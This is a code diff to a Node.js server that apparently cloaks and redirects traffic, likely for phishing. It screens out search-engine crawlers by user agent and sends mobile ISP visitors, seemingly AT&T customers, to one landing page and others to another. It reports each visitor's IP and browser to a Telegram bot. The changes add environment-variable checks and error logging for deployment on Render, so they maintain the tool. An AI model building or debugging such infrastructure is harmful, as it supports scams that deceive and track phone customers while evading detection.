@@ -158,10 +158,26 @@ const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE;
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
 const MOBILE_ISPS = (process.env.MOBILE_ISPS || "").split(',').map(isp => isp.trim()).filter(isp => isp !== "");
 
-if (!ADMIN_TOKEN || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !ATT_LANDING_PAGE || !NON_ATT_LANDING_PAGE) {
-    console.error('FATAL ERROR: Required environment variables (ADMIN_TOKEN, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ATT_LANDING_PAGE, NON_ATT_LANDING_PAGE) are missing from the hosting environment.');
+const missingEnvVars = [];
+if (!ADMIN_TOKEN) missingEnvVars.push('ADMIN_TOKEN');
+if (!TELEGRAM_BOT_TOKEN) missingEnvVars.push('TELEGRAM_BOT_TOKEN');
+if (!TELEGRAM_CHAT_ID) missingEnvVars.push('TELEGRAM_CHAT_ID');
+if (!ATT_LANDING_PAGE) missingEnvVars.push('ATT_LANDING_PAGE');
+if (!NON_ATT_LANDING_PAGE) missingEnvVars.push('NON_ATT_LANDING_PAGE');
+
+if (missingEnvVars.length) {
+    console.error(`FATAL ERROR: Missing required environment variables: ${missingEnvVars.join(', ')}. Set them in Render service settings.`);
     process.exit(1);
 }
+
+console.log('Environment variables loaded for production: ' +
+    `ADMIN_TOKEN=${!!ADMIN_TOKEN}, ` +
+    `TELEGRAM_BOT_TOKEN=${!!TELEGRAM_BOT_TOKEN}, ` +
+    `TELEGRAM_CHAT_ID=${!!TELEGRAM_CHAT_ID}, ` +
+    `ATT_LANDING_PAGE=${!!ATT_LANDING_PAGE}, ` +
+    `NON_ATT_LANDING_PAGE=${!!NON_ATT_LANDING_PAGE}, ` +
+    `MOBILE_ISPS count=${MOBILE_ISPS.length}`
+);
 
 const BOT_USER_AGENTS = [
     'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'slurp', 'baiduspider', 'facebot', 'ia_archiver',
@@ -249,7 +265,9 @@ app.get('/init', async (req, res) => {
                 text: `✨ *FORCED REDIRECT VISIT* \n\n📍 *IP:* ${clientIp}\n💻 *Browser:* ${userAgent}\n🕒 *Time:* ${new Date().toLocaleString()}`,
                 parse_mode: 'Markdown'
             });
-        } catch (e) {}
+        } catch (e) {
+            console.error('[Telegram] Forced visit notification failed:', e.response?.data || e.message);
+        }
         return res.json({ redirect: '/go-att' });
     }
 
@@ -300,7 +318,9 @@ app.get('/init', async (req, res) => {
             text: message,
             parse_mode: 'Markdown'
         });
-    } catch (e) {}
+    } catch (e) {
+        console.error('[Telegram] Notification failed:', e.response?.data || e.message);
+    }
 
     // 4. FINAL REDIRECT LOGIC
     let targetUrl = NON_ATT_LANDING_PAGE;
